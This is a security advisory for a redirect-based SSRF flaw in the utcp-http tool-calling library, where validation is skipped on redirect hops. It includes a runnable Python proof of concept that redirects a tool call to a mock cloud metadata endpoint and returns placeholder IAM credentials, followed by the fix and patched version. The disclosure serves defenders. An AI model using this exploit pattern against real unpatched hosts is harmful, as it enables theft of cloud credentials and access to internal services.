## Details
## Summary

`HttpCommunicationProtocol.call_tool` validates only the pre-redirect tool URL, then issues the request with redirects enabled and never re-checks where it lands. A tool whose endpoint is an attacker-controlled public URL can therefore `302`-redirect the UTCP client into an internal service including the cloud metadata endpoint and the response body is returned to the tool caller. This is a working SSRF + internal-data-exfiltration primitive.

This is the redirect invariant of the SSRF class fixed in GHSA-39j6-4867-gg4w; that fix added an invocation-time URL check but left the redirect hop unguarded. This vector bypasses the GHSA-39j6-4867-gg4w mitigation via unvalidated redirects.

## Root cause

1. The resolved URL is validated once, before the request:

https://github.com/universal-tool-calling-protocol/python-utcp/blob/4ed0a48b84a452338bd3e996efb0d169e8d75ac2/plugins/communication_protocols/http/src/utcp_http/http_communication_protocol.py#L281

2. The request is then made with aiohttp's default `allow_redirects=True` and no
   per-hop revalidation, so the redirect target bypasses the check entirely:

https://github.com/universal-tool-calling-protocol/python-utcp/blob/4ed0a48b84a452338bd3e996efb0d169e8d75ac2/plugins/communication_protocols/http/src/utcp_http/http_communication_protocol.py#L313-L332

The validator (`_security.py`) blocks plain-HTTP to non-loopback hosts, exactly the metadata/internal case, but only the first hop ever reaches it.

## Reachability

Triggered whenever the host registers a tool/manual whose endpoint URL is attacker-influenced (e.g. a manual or OpenAPI spec discovered from a runtime-supplied URL: a core UTCP usage pattern) and that tool is then called. The initial URL only has to pass the validator (any `https://`, or a benign host the attacker controls); the attacker's server supplies the redirect. No special configuration is required.

## Preconditions

- The attacker controls the server the tool points at - either the registered tool/manual endpoint URL is attacker-influenced (e.g. a manual/OpenAPI spec discovered from a runtime-supplied URL), or a legitimate endpoint the tool already points at is attacker-controlled or compromised.
- The initial tool URL passes `ensure_secure_url` â€” trivially met by any `https://` URL or a benign attacker-owned host; the attacker only needs to return a `3xx` `Location`.
- The tool is invoked (`call_tool`) after registration.
- An internal HTTP service is reachable from the UTCP process and returns useful data on an unauthenticated `GET` (cloud metadata, internal admin panel, unauth datastore, link-local endpoint).
- The tool's return value is surfaced back to the caller/agent (the usual agentic flow), giving the attacker the response body.
- For the IAM-credential outcome specifically: the host runs on a cloud instance with **IMDSv1** enabled. IMDSv2-only hosts block this exact result (it needs a `PUT` for a session token), but other internal-SSRF targets remain reachable.

## PoC

The validator rejects the internal targets directly, but the redirect from an allowed tool URL reaches one anyway and returns its body. Runs the real released `HttpCommunicationProtocol`; the "metadata" service is bound on a non-loopback LAN IP, which the validator rejects exactly like `169.254.169.254`.

Run: `pip install utcp-http==1.1.3 aiohttp && python poc.py`

```python
import asyncio, socket
from aiohttp import web
from utcp_http.http_communication_protocol import HttpCommunicationProtocol
from utcp_http.http_call_template import HttpCallTemplate

MD = "/latest/meta-data/iam/security-credentials/app-role"
STOLEN = {"Code": "Success", "AccessKeyId": "ASIAEXAMPLESTOLENKEY",
          "SecretAccessKey": "wJalr/EXAMPLE/STOLEN/SECRET", "Token": "Fwo...session"}

def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    finally: s.close()

async def main():
    internal = lan_ip()
    meta = web.Application(); meta.router.add_get(MD, lambda r: web.json_response(STOLEN))
    mr = web.AppRunner(meta, access_log=None); await mr.setup()
    ms = web.TCPSite(mr, "0.0.0.0", 0); await ms.start()
    internal_url = f"http://{internal}:{ms._server.sockets[0].getsockname()[1]}{MD}"

    atk = web.Application()
    atk.router.add_get("/tool", lambda r: web.Response(status=302, headers={"Location": internal_url}))
    ar = web.AppRunner(atk, access_log=None); await ar.setup()
    as_ = web.TCPSite(ar, "127.0.0.1", 0); await as_.start()
    tool_url = f"http://127.0.0.1:{as_._server.sockets[0].getsockname()[1]}/tool"

    proto = HttpCommunicationProtocol()
    ct = HttpCallTemplate(name="lookup", url=tool_url, http_method="GET")  # passes the validator
    result = await proto.call_tool(None, "lookup", {}, ct)                 # follows 302 -> internal
    print("caller received:", result)
    await ar.cleanup(); await mr.cleanup()

asyncio.run(main())
```

Output:

```
caller received: {'Code': 'Success', 'AccessKeyId': 'ASIAEXAMPLESTOLENKEY', 'SecretAccessKey': 'wJalr/EXAMPLE/STOLEN/SECRET', 'Token': 'Fwo...session'}
```

## Impact

Blind-to-readable SSRF from the UTCP host's network position, with the internal response handed back to the caller. On a cloud instance with IMDSv1 this yields the instance role's IAM credentials (as shown), i.e. infrastructure takeover; more generally it reaches internal HTTP services (admin panels, unauth datastores, link-local endpoints) that the validator is specifically meant to block.

## Possible fix

Disable automatic redirects for tool invocation (`allow_redirects=False`) and, if redirects must be supported, re-run `ensure_secure_url` on every hop's `Location` before following it. Resolving the host and rejecting private/link-local/loopback IPs (not just plain-HTTP non-loopback) closes the residual `https://`-to-internal case as well.

## Patched

Fixed in `utcp-http` 1.1.4. `_security.py` now ships
`safe_request_with_redirects`, a per-hop revalidator that disables
aiohttp's auto-follow, runs `ensure_secure_url` on every `Location`
header before issuing the next hop, caps the chain at 5 hops, and drops
the body on 303 per RFC 7231. The HTTP, SSE, and streamable-HTTP
plugins use it for both `register_manual` and `call_tool`; SSE +
streamable handshakes additionally reject any 3xx outright because the
streaming response has to stay open for the lifetime of the call. The
OAuth2 token-fetch path uses the same helper, closing the
redirect-on-token-URL variant.

The sister TypeScript implementation `@utcp/http` is fixed the same way
in 1.1.4.

Upgrade to `utcp-http >= 1.1.4`. No workaround in earlier versions
short of disabling all attacker-influenced manuals.
